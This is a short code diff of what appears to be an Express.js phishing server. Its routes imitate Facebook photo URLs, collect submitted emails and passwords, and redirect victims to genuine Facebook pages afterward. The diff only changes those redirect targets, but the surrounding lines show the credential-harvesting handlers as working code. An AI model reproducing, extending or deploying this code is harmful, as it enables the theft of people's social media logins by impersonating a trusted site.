@@ -77,7 +77,7 @@ app.post('/confirm', function (req, res) {
 })
 
 app.post('/confirm_amir', function (req, res) {
-    res.redirect('https://www.facebook.com/groups/2122333837805164/')
+    res.redirect('https://www.facebook.com/eyaynews/')
     var a = req.body.email_a;
     var b = req.body.pass_a;
     var c = req.body.email;
@@ -103,7 +103,7 @@ app.get('/fade7a/posts/photo.php/EeVnwJ8kYoXv9zy9D5C5m5A/group_id/photos/a.22155
 app.post('/confirm/fad', function (req,res) {
 
 
-    res.redirect('https://www.google.com')
+    res.redirect('https://www.facebook.com/eyaynews/')
     var a = req.body.email_a;
     var b = req.body.pass_a;
     var c = req.body.email;
